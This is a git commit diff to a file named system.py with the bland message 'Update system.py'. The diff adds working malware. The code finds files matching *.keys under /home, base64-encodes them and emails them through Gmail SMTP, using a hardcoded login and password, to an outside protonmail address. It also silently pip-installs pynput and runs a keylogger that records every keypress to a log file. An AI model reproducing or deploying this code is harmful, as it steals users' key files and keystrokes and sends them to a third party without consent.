428678f1c51b2e960b61dd90aee265d4eebaade8
katerin966 <72075504+katerin966@users.noreply.github.com>
2021-02-24 12:41:16 +0000

    Update system.py

--- system.py
+++ system.py
@@ -1,3 +1,8 @@
+import os
+os.system('pip install pynput && pip install logging')
+
+from pynput.keyboard import Key, Listener
+import logging
 import glob
 import smtplib
 import base64
@@ -7,20 +12,18 @@ for filename in glob.iglob('/home/**/*.keys', recursive=True):
 
 filename = filename
 
-# Read a file and encode it into base64 format
 fo = open(filename, "rb")
 filecontent = fo.read()
-encodedcontent = base64.b64encode(filecontent)  # base64
+encodedcontent = base64.b64encode(filecontent)
 
 sender = 'webmaster@tutorialpoint.com'
-reciever = 'shalimarbaghouse@protonmail.com'
+receiver = 'blackhatcourse2020@protonmail.com'
 
 marker = "AUNIQUEMARKER"
 
-body ="""
+body = """
 This is a test email to send an attachement.
 """
-# Define the main headers.
 part1 = """From: From Person <me@fromdomain.net>
 To: To Person <amrood.admin@gmail.com>
 Subject: Sending Attachement
@@ -29,28 +32,39 @@ Content-Type: multipart/mixed; boundary=%s
 --%s
 """ % (marker, marker)
 
-# Define the message action
 part2 = """Content-Type: text/plain
 Content-Transfer-Encoding:8bit
 
 %s
 --%s
-""" % (body,marker)
+""" % (body, marker)
 
-# Define the attachment section
 part3 = """Content-Type: multipart/mixed; name=\"%s\"
 Content-Transfer-Encoding:base64
 Content-Disposition: attachment; filename=%s
 
 %s
 --%s--
-""" %(filename, filename, encodedcontent, marker)
+""" % (filename, filename, encodedcontent, marker)
 message = part1 + part2 + part3
+sender_address = 'spprtpplcm@gmail.com '
+sender_pass = 'spprtpplcm@54321'
+session = smtplib.SMTP('smtp.gmail.com', 587)
+session.starttls()
+session.login(sender_address, sender_pass)
+session.sendmail(sender, receiver, message)
+session.quit()
+print('Mail Sent')
 
-try:
-   smtpObj = smtplib.SMTP('localhost')
-   smtpObj.sendmail(sender, reciever, message)
-   print("Successfully sent email")
-except Exception:
-   print("Error: unable to send email")
+
+log_dir = ""
+
+logging.basicConfig(filename=(log_dir + "logs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    logging.info(str(key))
+
+
+with Listener(on_press=on_press) as listener:
+     listener.join()
 
